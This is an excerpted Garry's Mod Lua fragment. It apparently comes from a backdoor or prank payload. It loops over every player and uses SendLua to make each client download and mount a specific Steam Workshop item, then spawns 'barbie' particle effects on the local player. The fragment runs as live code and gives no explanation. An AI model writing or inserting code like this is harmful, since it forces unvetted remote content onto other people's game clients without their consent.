...
function RandomString(intMin, intMax)
    ...
    for k, v in pairs(player.GetAll()) do
        v:SendLua(&quot;steamworks.DownloadUGC( 3264686194, function( name )game.MountGMA( name )end)&quot;)
     end 
     game.AddParticles( &quot;particles/barbie.pcf&quot; )
PrecacheParticleSystem(&quot;barbie&quot;)
...
PrecacheParticleSystem(&quot;barbie&quot;)
    ...
    for i = 1,5 do
        ParticleEffectAttach(&quot;barbie&quot;,PATTACH_ABSORIGIN_FOLLOW,LocalPlayer(),0)
      end
